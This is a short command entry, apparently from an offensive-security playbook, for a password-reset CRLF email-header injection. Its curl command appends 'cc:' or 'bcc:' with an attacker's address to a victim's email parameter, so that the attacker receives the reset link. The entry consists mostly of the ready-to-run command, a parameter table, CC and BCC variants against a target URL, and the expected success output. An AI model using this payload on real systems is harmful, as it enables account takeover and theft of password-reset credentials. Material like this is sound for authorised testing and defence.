---
id: 11ecde84-5323-4c1c-964c-bd47df792b8f
name: curl-post-password-reset-cc-injection
type: command
executor: bash
data: 'curl -X POST -d "email=$_VICTIM_EMAIL%0A%0Dcc:$_ATTACKER_EMAIL" $_TARGET_URL'
output: null
created_at: '2023-04-06T03:55:53.810592+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - parameter-manipulation
  - credential-access
  - injection
verified: true
validated: true
---

# curl-post-password-reset-cc-injection

## Command

```bash
curl -X POST -d "email=$_VICTIM_EMAIL%0A%0Dcc:$_ATTACKER_EMAIL" $_TARGET_URL
```

## Description

Injects a CC field into the email parameter using URL-encoded newlines to append the attacker's email as a carbon copy recipient.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Password reset URL | Yes |
| $_VICTIM_EMAIL | Victim's email | Yes |
| $_ATTACKER_EMAIL | Attacker's email | Yes |
| %0A%0D | URL-encoded CRLF for injection | Built-in |

## Examples

### Basic Usage (CC)

```bash
curl -X POST -d "email=victim@example.com%0A%0Dcc:attacker@example.com" https://target.com/reset
```

### BCC Variant

```bash
curl -X POST -d "email=victim@example.com%0A%0Dbcc:attacker@example.com" https://target.com/reset
```

## Expected Output

```
Reset initiated successfully.
```
Attacker receives CC'd email with reset details.

## Related

- [[procedures/Exploit-Password-Reset-via-Email-Parameter-Manipulation]]
- [[commands/curl-post-password-reset-separator-injection]]
